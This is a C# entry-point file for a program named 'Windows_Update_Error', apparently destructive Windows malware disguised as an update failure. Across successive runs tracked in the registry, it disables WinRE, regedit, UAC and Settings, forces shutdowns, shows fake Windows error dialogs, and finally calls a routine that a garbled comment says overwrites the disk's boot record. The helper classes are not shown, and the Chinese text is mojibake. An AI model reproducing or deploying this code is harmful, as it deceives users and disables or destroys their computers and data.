using System.Diagnostics;
using System.Security.Cryptography.X509Certificates;

namespace Windows_Update_Error
{
    internal static class Program
    {
        /// <summary>
        ///  The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            // To customize application configuration such as set high DPI settings or default font,
            // see https://aka.ms/applicationconfiguration.
            ApplicationConfiguration.Initialize();
            Regedit_Set regedit1 = new Regedit_Set();
            Test test1 = new Test();
            string regedit1_Start = regedit1.Start_Detection();         //��ȡ������
            if (regedit1_Start == "114514")
            {
                regedit1_Start = "8479838";
                regedit1.Start_Update(regedit1_Start);
                try
                {
                    regedit1.PC_Start();
                    test1.Disable_WinRE();
                    regedit1.Disable_Regedit();
                }
                catch(Exception ex)
                {
                    MessageBox.Show(ex.Message,"����",MessageBoxButtons.OK,MessageBoxIcon.Error);
                }
                regedit1.UAC_OFF();
                regedit1.Disable_Settings();
                Thread.Sleep(5000);
                test1.Shutdown_PC();
            }
            else if (regedit1_Start == "8479838")
            {
                regedit1_Start = "7453567";
                regedit1.Start_Update(regedit1_Start);
                msg1();
                Application.Run(new Form2());
            }
            else if (regedit1_Start == "7453567")
            {
                regedit1_Start = "84634846";
                regedit1.Start_Update(regedit1_Start);
                msg2();
                Application.Run(new Form2());
            }
            else if (regedit1_Start == "84634846")
            {
                regedit1_Start = "847327473";
                regedit1.Start_Update(regedit1_Start);
                msg3();
                Application.Run(new Form2());
            }
            else if (regedit1_Start == "847327473")
            {
                test1.killmbrA();            //�۸�Ӳ�̵��������ļ�
                test1.Nt_Error();
            }
            void msg1()
            {
                MessageBox.Show("����ʧ�ܣ�Windows�޷��޸���ĵ���", "����", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            void msg2()
            {
                MessageBox.Show("����������δ֪�����޷���������Windows���", "����", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            void msg3()
            {
                MessageBox.Show("�����޷��ָ���Ҫ��Windows���", "����", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
    }
}